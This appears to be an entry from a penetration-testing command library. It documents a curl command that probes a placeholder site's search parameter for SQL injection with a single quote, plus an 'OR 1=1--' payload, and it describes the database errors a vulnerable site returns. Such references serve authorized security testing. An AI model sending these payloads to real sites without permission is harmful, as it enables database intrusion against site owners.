---
id: cmd-curl-basic-sqli-test
data: 'curl "https://target.com/search?q=''" -v'
tags:
  - sqli
  - injection
  - web
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:28.604Z'
verified: false
validated: true
submitted: true
---
# curl-basic-sqli-test

## Command

```bash
curl "https://target.com/search?q='" -v
```

## Description

Tests for SQL injection by injecting a single quote into the search query to trigger potential database errors.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `q='` | Payload with single quote | Yes |
| `-v` | Verbose mode | No |

## Examples

### Basic Usage

```bash
curl "https://target.com/search?q='" -v
```

### Advanced Usage

```bash
curl "https://target.com/search?q=' OR 1=1--" -v
```

## Expected Output

Response with SQL error message if vulnerable, such as syntax error details from the database.

## Related

- [[Test SQL Injection Payload]]
